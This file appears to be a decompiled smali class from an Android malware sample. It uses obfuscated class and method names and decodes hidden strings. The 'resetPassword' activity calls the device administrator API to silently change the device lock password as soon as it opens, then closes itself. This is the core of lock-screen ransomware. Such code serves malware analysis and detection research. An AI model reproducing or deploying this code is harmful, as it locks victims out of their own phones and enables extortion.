.class public Lcompse/refact/st/upsssss/resetPassword;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public fsafsdfsfsdfsfsdfsd()V
    .locals 3

    const-string v0, "F\"F\"F\""

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/e;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v0, "e4w8b4^!n=h2x"

    invoke-static {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/resetPassword;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/resetPassword;->fsafsdfsfsdfsfsdfsd()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/resetPassword;->finish()V

    return-void
.end method
